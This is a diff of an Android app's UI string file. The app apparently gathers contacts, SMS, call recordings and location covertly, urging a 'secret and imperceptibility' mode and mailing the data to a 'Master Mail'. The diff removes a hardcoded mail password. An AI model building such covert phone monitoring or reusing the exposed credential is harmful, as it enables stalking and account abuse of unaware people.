@@ -39,7 +39,6 @@
     <string name="phonecall_record">PhoneCallRecord</string>
     
     <!-- Mail -->
-    <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">From</string>
     <string name="mail_description">(contacts, SMS and phone call list attached)</string>
     <string name="mail_body_info">Hi, this is an auto mail from %s with contacts, SMS and phone call list attached.</string>
@@ -57,7 +56,7 @@
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
     <string name="pref_category_sender_mail_key">pref_category_sender</string>
-    <string name="pref_category_sender_mail_title">Mail Sender(Optional)</string>
+    <string name="pref_category_sender_mail_title">Mail Sender</string>
     <string name="pref_category_receiver_key">pref_category_receiver</string>
     <string name="pref_category_receiver_title">Master Settings</string>
     <string name="pref_category_info_collector_key">pref_category_info_collector</string>
@@ -69,9 +68,8 @@
     <string name="pref_category_gps_title">Get Phone Location</string>
     <string name="pref_category_ring_title">Belling</string>
     
-    <string name="pref_use_self_sender_title">Use My Mail Sender</string>
-    <string name="pref_use_self_sender_summary">Use your own mail sender(GMail/QQ ONLY) for better privacy protection, otherwise it will use system default mail sender.</string>
     <string name="pref_sender_mail_title">Mail Sender(GMail/QQ ONLY)</string>
+    <string name="pref_sender_mail_summary">Only GMail and QQ mail are supported.</string>
     <string name="pref_sender_pwd_title">Password</string>
     <string name="pref_invalid_sender_mail">%s is not a valid mail sender</string>
     <string name="pref_recv_mail_title">Master Mail</string>
@@ -101,7 +99,6 @@
     <string name="pref_network_mode_summary">Recommend to use "Silent" or "WIFI Silent" mode for secret and imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
     <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
-    <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own mail sender.</string>
     <string name="pref_ring_word_title">Force Belling</string>
     <string name="pref_ring_word_summary">Send SMS(#bell) to force belling.</string>
     
